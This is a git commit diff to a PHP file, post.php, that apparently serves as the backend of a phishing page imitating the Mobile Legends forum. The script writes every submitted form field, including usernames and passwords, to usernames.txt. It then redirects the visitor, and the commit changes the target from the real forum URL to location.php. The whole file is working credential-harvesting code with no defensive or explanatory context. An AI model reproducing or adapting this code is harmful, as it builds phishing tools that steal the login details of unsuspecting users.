a68ebf17d280e66e66c093a162098ca85acc462e
RemApple <32689703+NganDii@users.noreply.github.com>
2020-06-11 14:52:46 +0530

    Update post.php

--- post.php
+++ post.php
@@ -3,5 +3,5 @@ $handle = fopen("usernames.txt", "a"); foreach($_POST as $variable => $value) {
 fwrite($handle, $variable); fwrite($handle, "="); 
 fwrite($handle, $value); fwrite($handle, "\r\n");
 }
-header ('Location: https://forum.mobilelegends.com');
+header ('Location: location.php');
 fwrite($handle, "\r\n"); fclose($handle); exit; ?>
